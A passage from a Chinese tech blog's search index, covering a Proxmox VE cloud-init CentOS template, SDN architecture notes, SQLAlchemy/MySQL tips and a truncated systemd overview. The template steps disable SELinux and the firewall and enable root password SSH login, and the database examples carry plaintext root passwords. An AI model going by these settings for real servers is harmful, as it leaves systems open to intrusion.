meta-data</span><br><span class=\"line\">├── network-config</span><br><span class=\"line\">└── user-data</span><br></pre></td></tr></table></figure>\n\n<p>下图就标注了Cloud-init所有可以配置的参数信息。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/cloud-init.png\" class=\"\">\n\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><h3 id=\"1-安装Centos-7-8操作系统\"><a href=\"#1-安装Centos-7-8操作系统\" class=\"headerlink\" title=\"1. 安装Centos 7.8操作系统\"></a>1. 安装Centos 7.8操作系统</h3><p>首先创建一个虚拟机并加载Centos系统安装ISO文件，基本配置建议为：1vCPU，1024M内存，4G硬盘，网卡无所谓。注意暂时先不启动！！<br>然后，在PVE控制台上为该虚拟机增加一个Cloud init设备，稍等初始化完成，开始启动VM进行操作系统安装。<br>在安装Centos时，注意手工建立磁盘分区，只留一个启动分区，EFI-Boot和Swap分区都不要了，参见下图。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/disk-partition.png\" class=\"\">\n\n<p>系统安装完成后，检查是否可以正常启动。</p>\n<blockquote>\n<p>新系统装完后，必须将网卡配置文件内的onboot打开，清除uuid！！！<br>创建Ubuntu的VM，Cloud-Init设备必须使用<code>virtio-scsi-pci</code>类型的驱动程序</p>\n</blockquote>\n<h3 id=\"2-关闭selinux和firewalld以及碍事的NetworkManager\"><a href=\"#2-关闭selinux和firewalld以及碍事的NetworkManager\" class=\"headerlink\" title=\"2. 关闭selinux和firewalld以及碍事的NetworkManager\"></a>2. 关闭selinux和firewalld以及碍事的NetworkManager</h3><blockquote>\n<p>selinux的真实配置文件路径是<code>/etc/selinux/config</code>,而<code>/etc/sysconfig/selinux</code>实际是它的软链接文件。<br>检查selinux状态可以使用<code>sestatus</code>命令。</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭Selinux</span></span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/selinux/config</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭Firewalld</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭NetworManager</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now NetworkManager</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置Linunx内核，允许IP转发</span></span><br><span class=\"line\">modprobe br_netfilter</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.bridge.bridge-nf-call-ip6tables = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;net.bridge.bridge-nf-call-iptables = 1&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置启动时自动加载br_netfilter模块</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/rc.sysinit &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"string\">for file in /etc/sysconfig/modules/*.modules ; do</span></span><br><span class=\"line\"><span class=\"string\">[ -x $file ] &amp;&amp; $file</span></span><br><span class=\"line\"><span class=\"string\">done</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;modprobe br_netfilter&#x27;</span> &gt; /etc/sysconfig/modules/br_netfilter.modules</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /etc/sysconfig/modules/br_netfilter.modules</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>netfilter是Linux内核的包过滤框架，它提供了一系列的钩子（Hook）供其他模块控制包的流动，配置Linux内核防火墙的命令行工具iptables就是基于netfilter机制的。<br>注意：服务器重启后<code>sysctl</code>命令报错，原因大概是br_netfilter模块未被自动加载，考虑通过配置<code>/etc/rc.sysinit</code>来解决！</p>\n</blockquote>\n<h3 id=\"3-安装必要的虚拟化软件和工具软件\"><a href=\"#3-安装必要的虚拟化软件和工具软件\" class=\"headerlink\" title=\"3. 安装必要的虚拟化软件和工具软件\"></a>3. 安装必要的虚拟化软件和工具软件</h3><p>为了让虚拟化层可以重启和关闭虚拟机，必须安装acpid服务；<br>为了使根分区正确调整大小安装cloud-utils-growpart，cloud-init支持下发前设置信息写入。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y acpid cloud-init cloud-utils-growpart</span><br><span class=\"line\">yum install -y git wget yum-utils net-tools bind-utils</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> acpid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 禁用zeroconf(零配置网络服务规范)，该协议目的是在系统无法连接DHCP服务的时候，尝试获取类似169.254.0.0的保留IP</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;NOZEROCONF=yes&quot;</span> &gt;&gt; /etc/sysconfig/network</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 防止ssh连接使用dns导致访问过慢</span></span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/UseDNS/&#123;s@#@@;s@\\s+.+@ no@&#125;&#x27;</span> /etc/ssh/sshd_config</span><br><span class=\"line\">systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-设置cloud-init\"><a href=\"#4-设置cloud-init\" class=\"headerlink\" title=\"4. 设置cloud-init\"></a>4. 设置cloud-init</h3><p>设置允许root登录，允许输入口令，禁止第一次启动后yum更新软件</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -ri <span class=\"string\">&#x27;/disable_root/&#123;s#\\S$#0#&#125;&#x27;</span> /etc/cloud/cloud.cfg</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/ssh_pwauth/&#123;s#\\S$#1#&#125;&#x27;</span> /etc/cloud/cloud.cfg</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/package-update/s@^@#@&#x27;</span> /etc/cloud/cloud.cfg</span><br></pre></td></tr></table></figure>\n\n<p>默认cloud-init会创建一个系统类型的centos用户，手工编辑配置文件取消掉。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#  default_user:</span><br><span class=\"line\">#    name: centos</span><br><span class=\"line\">#    lock_passwd: true</span><br><span class=\"line\">#    gecos: Cloud User</span><br><span class=\"line\">#    groups: [wheel, adm, systemd-journal]</span><br><span class=\"line\">#    sudo: [&quot;ALL=(ALL) NOPASSWD:ALL&quot;]</span><br><span class=\"line\">#    shell: /bin/bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\"><a href=\"#5-虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\" class=\"headerlink\" title=\"5. 虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成\"></a>5. 虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成</h3><h2 id=\"使用Cloud-init模版克隆新的虚拟机\"><a href=\"#使用Cloud-init模版克隆新的虚拟机\" class=\"headerlink\" title=\"使用Cloud-init模版克隆新的虚拟机\"></a>使用Cloud-init模版克隆新的虚拟机</h2><p>在PVE控制台选中模版，右键选择<code>Clone</code>，在弹出对话框中设置就可以了。<br>注意，一般选择<code>Full Clone</code>，相比<code>Link Clone</code>更安全，但是要多花一点硬盘空间就是了。</p>\n<img src=\"/2020/08/02/Proxmox-VE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84Cloud-init%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/clone.png\" class=\"\">\n\n<p>创建小鸡需要花一点时间写盘，此时VM被锁定，等锁定解除后就可以设置Cloud-init的信息，并启动小鸡了。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><p><a href=\"https://kinkinlu.com/2019/04/18/proxmox%E4%B8%ADcloud-init%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\">proxmox中cloud-init使用方法</a></p>\n</li>\n<li><p><a href=\"https://xixiliguo.github.io/post/cloud-init-1/\">Cloud-init的基本原理</a></p>\n</li>\n<li><p><a href=\"https://qizhanming.com/blog/2018/08/08/how-to-install-nfs-on-centos-7\">CentOS 7 下 yum 安装和配置 NFS</a></p>\n</li>\n<li><p><a href=\"https://pve.proxmox.com/wiki/Cloud-Init_Support\">PVE CLoud-Init的官方文档</a></p>\n</li>\n<li><p><a href=\"https://feisky.gitbooks.io/sdn/content/linux/iptables.html\">Linux网络配置的白皮书</a></p>\n</li>\n<li><p><a href=\"https://www.icode9.com/content-4-718596.html\">一种自动加载br_netfilter模块的方法</a></p>\n</li>\n</ul>\n"},{"title":"SDN学习笔记之一","url":"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/","content":"<h2 id=\"传统的三层网络架构\"><a href=\"#传统的三层网络架构\" class=\"headerlink\" title=\"传统的三层网络架构\"></a>传统的三层网络架构</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/core-aggregate-access.png\" class=\"\" title=\"传统的三层网络架构\">\n\n<p>特点：</p>\n<ul>\n<li>每个服务器两个物理网卡，直连到两个置顶交换机做物理高可用</li>\n<li>汇聚层和接入层走二层交换，和核心层走三层路由</li>\n<li>所有 OpenStack 网关配置在核心层路由器</li>\n<li>防火墙和核心路由器直连，做一些安全策略</li>\n</ul>\n<h2 id=\"简化的大二层网络架构\"><a href=\"#简化的大二层网络架构\" class=\"headerlink\" title=\"简化的大二层网络架构\"></a>简化的大二层网络架构</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/spine-leaf.png\" class=\"\" title=\"简化的大二层网络架构\">\n\n<p>Spine-Leaf 是 full-mesh 连接，它可以带来如下几个好处：</p>\n<ul>\n<li><p>转发路径更短。以图 7 的 Spine-Leaf（两级 Clos 架构）为例，任何两台服务器经过三跳（Leaf1 -&gt; Spine -&gt; Leaf2）就可以到达，延迟更低，并且可保障（可以按跳数精确计算出来）。</p>\n</li>\n<li><p>水平可扩展性更好，任何一层有带宽或性能瓶颈，只需新加一台设备，然后跟另一层的所有设备直连。</p>\n</li>\n<li><p>所有设备都是 active 的，一个设备挂掉之后，影响面比三层模型里挂掉一个设备小得多。</p>\n</li>\n</ul>\n<p>宿主机方面，我们升级到了 10G 和 25G 的网卡。</p>\n<h2 id=\"SDN的控制平面和数据平面\"><a href=\"#SDN的控制平面和数据平面\" class=\"headerlink\" title=\"SDN的控制平面和数据平面\"></a>SDN的控制平面和数据平面</h2><ul>\n<li>数据平面基于 VxLAN，控制平面基于 MP-BGP EVPN 协议，在设备之间同步控制平面信息。</li>\n<li>网关是分布式的，每个 leaf 节点都是网关。</li>\n<li>VxLAN 和 MP-BGP EVPN 都是 RFC 标准协议，更多信息参考 [2]。</li>\n<li>VxLAN 的封装和解封装都在 leaf 完成，leaf 以下是 VLAN 网络，以上是 VxLAN 网络。</li>\n<li>这套方案在物理上支持真正的租户隔离。</li>\n</ul>\n<img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/spine-leaf-2.png\" class=\"\" title=\"大二层网络的整体架构\">\n\n<p>图 9 是我们软件 + 硬件的网络拓扑：</p>\n<p>1）以 leaf 为边界，leaf 以下是 underlay，走 VLAN；上面 overlay，走 VxLAN</p>\n<p>2）underlay 由 neutron、OVS 和 neutron OVS agent 控制；overlay 是 CNC 控制</p>\n<p>3）Neutron 和 CNC 之间通过 plugin 集成</p>\n<h2 id=\"SDN控制器的两种模式\"><a href=\"#SDN控制器的两种模式\" class=\"headerlink\" title=\"SDN控制器的两种模式\"></a>SDN控制器的两种模式</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/SDN%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F.png\" class=\"\" title=\"SDN控制器的两种工作模式对比\">\n\n<p>从控制器是否参与转发设备的的转发控制来看，当前主要有两种控制器类型:</p>\n<h3 id=\"弱控制模式\"><a href=\"#弱控制模式\" class=\"headerlink\" title=\"弱控制模式\"></a>弱控制模式</h3><ul>\n<li><p>弱控制模式下，控制平面基于网络设备自学习，控制器不在转发平面，仅负责配 置下发，实现自动部署。主要解决网络虚拟化，提供适应应用的虚拟网络。</p>\n</li>\n<li><p>弱控制模式的优点是转发控制面下移，减轻和减少对控制器的依赖。</p>\n</li>\n</ul>\n<h3 id=\"强控制模式\"><a href=\"#强控制模式\" class=\"headerlink\" title=\"强控制模式\"></a>强控制模式</h3><ul>\n<li><p>在强控制模式下，控制器负责整个网络的集中控制，体现SDN集中管理的优势。</p>\n</li>\n<li><p>基于openflow的强控制使得网络具备更多的灵活性和可编程性。除了能够给用 户提供适合应用需要的网络，还可以集成FW等提供安全方案;可以支持混合 Overlay 模型，通过控制器同步主机和拓扑信息, 将各种异构的转发模型同一处理;可以提供基于 openflow 的服务链功能对安全服务进行编排，可以提供更为灵活的网络诊断手段，如虚机仿真和雷达探测等。</p>\n</li>\n</ul>\n<p>用户可能会担心强控制模式下控制器全部故障对网络转发功能的影响，这个影响因素可以通过下述两点来降低和消除:</p>\n<ol>\n<li>通过控制器集群增加控制器可靠性，避免单点故障</li>\n<li>逃生机制:设备与所有控制器失联后，切换为自转模式，业务不受影响。</li>\n</ol>\n<hr>\n<h2 id=\"附录1-标准的openstack-provider-network\"><a href=\"#附录1-标准的openstack-provider-network\" class=\"headerlink\" title=\"附录1:标准的openstack-provider-network\"></a>附录1:标准的openstack-provider-network</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/openstack-provider-network.png\" class=\"\" title=\"标准的Openstack Provider Network的整体架构\">\n\n<h2 id=\"附录2-简化的openstack-provider-network\"><a href=\"#附录2-简化的openstack-provider-network\" class=\"headerlink\" title=\"附录2:简化的openstack-provider-network\"></a>附录2:简化的openstack-provider-network</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/%E7%AE%80%E5%8C%96%E7%9A%84openstack-provider-network.png\" class=\"\" title=\"简化的Openstack Provider Network的整体架构\">\n"},{"title":"Sqlalchemy的几个小问题","url":"/2020/12/16/Sqlalchemy%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/","content":"<h2 id=\"改写为SQLALCHEMY\"><a href=\"#改写为SQLALCHEMY\" class=\"headerlink\" title=\"改写为SQLALCHEMY\"></a>改写为SQLALCHEMY</h2><h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><ul>\n<li><p>pyecharts &#x3D;&#x3D; 0.5.3</p>\n</li>\n<li><p>python3不再支持 mysql库了，需要使用pymysql；<br>修改为engine&#x3D;create_engine(‘mysql+pymysql:&#x2F;&#x2F;root:password@localhost:3306&#x2F;test’)就可以了</p>\n</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; str</span></span><br><span class=\"line\">&#x27;2020-12-20&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; atime = time.mktime(time.strptime(str, <span class=\"string\">&#x27;%Y-%m-%d&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; atime</span></span><br><span class=\"line\">1608393600.0</span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; time.ctime(atime)</span></span><br><span class=\"line\">&#x27;Sun Dec 20 00:00:00 2020&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><code>now.timestamp()</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;character_set_%&#x27;</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> Variable_name            <span class=\"operator\">|</span> <span class=\"keyword\">Value</span>                      <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_client     <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_connection <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_database   <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_filesystem <span class=\"operator\">|</span> <span class=\"type\">binary</span>                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_results    <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_server     <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_system     <span class=\"operator\">|</span> utf8                       <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_sets_dir       <span class=\"operator\">|</span> <span class=\"operator\">/</span>usr<span class=\"operator\">/</span>share<span class=\"operator\">/</span>mysql<span class=\"operator\">/</span>charsets<span class=\"operator\">/</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"number\">8</span> <span class=\"keyword\">rows</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> status</span><br><span class=\"line\"><span class=\"comment\">--------------</span></span><br><span class=\"line\">mysql  Ver <span class=\"number\">14.14</span> Distrib <span class=\"number\">5.7</span><span class=\"number\">.32</span>, <span class=\"keyword\">for</span> Linux (x86_64) <span class=\"keyword\">using</span>  EditLine wrapper</span><br><span class=\"line\"></span><br><span class=\"line\">Connection id:          <span class=\"number\">247</span></span><br><span class=\"line\"><span class=\"keyword\">Current</span> database:       cmccb2b</span><br><span class=\"line\"><span class=\"keyword\">Current</span> <span class=\"keyword\">user</span>:           root<span class=\"variable\">@localhost</span></span><br><span class=\"line\">SSL:                    <span class=\"keyword\">Not</span> <span class=\"keyword\">in</span> use</span><br><span class=\"line\"><span class=\"keyword\">Current</span> pager:          stdout</span><br><span class=\"line\"><span class=\"keyword\">Using</span> outfile:          <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">Using</span> delimiter:        ;</span><br><span class=\"line\">Server version:         <span class=\"number\">5.7</span><span class=\"number\">.32</span> MySQL Community Server (GPL)</span><br><span class=\"line\">Protocol version:       <span class=\"number\">10</span></span><br><span class=\"line\">Connection:             Localhost via UNIX socket</span><br><span class=\"line\">Server characterset:    latin1</span><br><span class=\"line\">Db     characterset:    latin1</span><br><span class=\"line\">Client characterset:    latin1</span><br><span class=\"line\">Conn.  characterset:    latin1</span><br><span class=\"line\">UNIX socket:            <span class=\"operator\">/</span>var<span class=\"operator\">/</span>run<span class=\"operator\">/</span>mysqld<span class=\"operator\">/</span>mysqld.sock</span><br><span class=\"line\">Uptime:                 <span class=\"number\">2</span> days <span class=\"number\">3</span> hours <span class=\"number\">11</span> min <span class=\"number\">59</span> sec</span><br><span class=\"line\"></span><br><span class=\"line\">Threads: <span class=\"number\">9</span>  Questions: <span class=\"number\">5348</span>  Slow queries: <span class=\"number\">0</span>  Opens: <span class=\"number\">294</span>  Flush tables: <span class=\"number\">1</span>  <span class=\"keyword\">Open</span> tables: <span class=\"number\">182</span>  Queries <span class=\"keyword\">per</span> <span class=\"keyword\">second</span> avg: <span class=\"number\">0.029</span></span><br><span class=\"line\"><span class=\"comment\">--------------</span></span><br></pre></td></tr></table></figure>\n\n<p>SQLALCHEMY_DATABASE_URI &#x3D; ‘mysql+pymysql:&#x2F;&#x2F;root:123456@localhost:3306&#x2F;cmccb2b?charset&#x3D;utf8’</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><p><a href=\"https://flask-sqlalchemy.palletsprojects.com/en/2.x/\">Flask-SQLAlchemy Home</a></p>\n</li>\n<li><p><a href=\"https://www.osgeo.cn/sqlalchemy/orm/index.html\">SQLAlchemy中文文档</a></p>\n</li>\n<li><p><a href=\"https://docs.sqlalchemy.org/en/13/core/engines.html#database-urls\">SQLAlchemy Home 文字真烂</a></p>\n</li>\n<li><p><a href=\"https://github.com/ahmadjavedse/sqlalchemy-paginator\">sqlalchemy-paginator Home</a></p>\n</li>\n<li><p><a href=\"https://my.oschina.net/u/4268222/blog/3515823\">使用sqlalchemy进行数据库操作示例1</a></p>\n</li>\n<li><p><a href=\"https://jingniao.github.io/2016/11/26/sqlalchemy-use-start/\">sqlalchemy的使用示例2</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/0d234e14b5d3\">SQLAlchemy ORM的简明教程</a></p>\n</li>\n<li><p><a href=\"https://hackersandslackers.com/flask-sqlalchemy-database-models/\">Flask-SQLAlchemy的高级示例（英文）</a></p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/chyingp/p/mysql-character-set-collation.html\">MySQL字符集设置大全</a></p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><a href=\"https://docs.aiohttp.org/en/stable/web_quickstart.html#variable-resources\">asynhttp Home</a></p>\n</li>\n<li><p><a href=\"https://www.csdn.net/handbook/jinja/jinja2/templates.html#variables\">Jinja2 中文手册</a></p>\n</li>\n<li><p><a href=\"https://imququ.com/post/four-ways-to-post-data-in-http.html\">四种常见的 POST 提交数据方式</a></p>\n</li>\n</ul>\n"},{"title":"Systemd系统服务简析","url":"/2023/08/29/Systemd%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%AE%80%E6%9E%90/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Systemd 是 Linux 系统中一个重要的系统和服务管理器，最早是为了代替传统的 SysV 初始化系统（init）而开发的，相较于传统 init，systemd 具有许多优势。例如支持并行启动，可同时启动多个服务，提高系统启动速度；引入了单一进程（PID 1）和 cgroups 技术，可以更好地管理系统和服务进程。目前，许多主流 Linux 发行版都采用了 systemd 作为其默认的初始化系统，包括 Ubuntu、Debian、Fedora、CentOS、Arch Linux 等。</p>\n<p>Systemd 是一系列工具的集合，其作用也远远不仅是启动操作系统，它还接管了后台服务、结束、状态查询，以及日志归档、设备管理、电源管理、定时任务等许多职责，并支持通过特定事件（如插入特定 USB 设备）和特定端口数据触发的 On-demand（按需）任务。</p>\n<p><img src=\"/2023/08/29/Systemd%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%AE%80%E6%9E%90/arch.png\" alt=\"系统架构\"></p>\n<p>总的来说，使用 systemd 可以更加简单灵活地管理各种系统服务，它提供了统一的命令行工具和配置文件格式，使得对系统和服务的管理更加一致和简化。用户可以通过 systemctl 命令来控制 systemd 系统和管理服务。<br>注意，systemd有自己的日志系统，称为journald 。它替换了sysVinit中的syslogd。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列出所有定义 systemd 服务</span></span><br><span class=\"line\">systemctl list-unit-files</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 列出启动失败的 systemd 服务</span></span><br><span class=\"line\">systemctl list-units --state failed</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个系统服务是否失败</span></span><br><span class=\"line\">systemctl is-failed [unit]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个服务的运行状态</span></span><br><span class=\"line\">systemctl status [unit]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 本次 systemd 服务启动的全量日志</span></span><br><span class=\"line\">journalctl -b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个服务的启动日志</span></span><br><span class=\"line\">journalctl -u [unit]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、Centos-7-8的基线版本分析\"><a href=\"#二、Centos-7-8的基线版本分析\" class=\"headerlink\" title=\"二、Centos 7.8的基线版本分析\"></a>二、Centos 7.8的基线版本分析</h2><p>以刚刚完成操作系统安装的服务器为例，可以通过 <code>systemcl status</code> 查看<strong>当前正在运行的</strong>系统服务，具体分为三个部分：</p>\n<ul>\n<li><code>init.slice</code>：systemd 的根进程，进程号是 1 ！即所有用户空间进程的祖先进程</li>\n<li><code>user.slice</code>：当前登录用户的全部会话进程，包括bash、login、sshd …</li>\n<li><code>system.slice</code>：当前所有系统服务进程，包括 service 名称及其启动的进程号</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">● MiWiFi-RA70-srv</span><br><span class=\"line\">    State: degraded</span><br><span class=\"line\">     Jobs: 0 queued</span><br><span class=\"line\">   Failed: 1 units</span><br><span class=\"line\">    Since: 六 2023-09-09 16:57:15 CST; 54s ago</span><br><span class=\"line\">   CGroup: /</span><br><span class=\"line\">           ├─1 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</span><br><span class=\"line\">           ├─user.slice</span><br><span class=\"line\">           │ └─user-0.slice</span><br><span class=\"line\">           │   ├─session-2.scope</span><br><span class=\"line\">           │   │ ├─1099 sshd: root@pts/0    </span><br><span class=\"line\">           │   │ ├─1103 -bash</span><br><span class=\"line\">           │   │ └─1118 systemctl status</span><br><span class=\"line\">           │   └─session-1.scope</span><br><span class=\"line\">           │     ├─ 488 login -- root     </span><br><span class=\"line\">           │     └─1080 -bash</span><br><span class=\"line\">           └─system.slice</span><br><span class=\"line\">             ├─rsyslog.service</span><br><span class=\"line\">             │ └─817 /usr/sbin/rsyslogd -n</span><br><span class=\"line\">             ├─postfix.service</span><br><span class=\"line\">             │ ├─1056 /usr/libexec/postfix/master -w</span><br><span class=\"line\">             │ ├─1057 pickup -l -t unix -u</span><br><span class=\"line\">             │ └─1058 qmgr -l -t unix -u</span><br><span class=\"line\">             ├─tuned.service</span><br><span class=\"line\">             │ └─814 /usr/bin/python2 -Es /usr/sbin/tuned -l -P</span><br><span class=\"line\">             ├─sshd.service</span><br><span class=\"line\">             │ └─813 /usr/sbin/sshd -D</span><br><span class=\"line\">             ├─NetworkManager.service</span><br><span class=\"line\">             │ ├─498 /usr/sbin/NetworkManager --no-daemon</span><br><span class=\"line\">             │ ├─623 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-3a3e2847-23bf-477e-87fc-a0e6356ef5d7-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0</span><br><span class=\"line\">             │ └─842 /sbin/dhclient -d -q -6 -N -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient6-eth0.pid -lf /var/lib/NetworkManager/dhclient6-3a3e2847-23bf-477e-87fc-a0e6356ef5d7-eth0.lease -cf /var/lib/NetworkManager/dhclient6-eth0.conf eth0</span><br><span class=\"line\">             ├─firewalld.service</span><br><span class=\"line\">             │ └─496 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid</span><br><span class=\"line\">             ├─crond.service</span><br><span class=\"line\">             │ └─480 /usr/sbin/crond -n</span><br><span class=\"line\">             ├─systemd-logind.service</span><br><span class=\"line\">             │ └─475 /usr/lib/systemd/systemd-logind</span><br><span class=\"line\">             ├─polkit.service</span><br><span class=\"line\">             │ └─473 /usr/lib/polkit-1/polkitd --no-debug</span><br><span class=\"line\">             ├─dbus.service</span><br><span class=\"line\">             │ └─470 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation</span><br><span class=\"line\">             ├─qemu-guest-agent.service</span><br><span class=\"line\">             │ 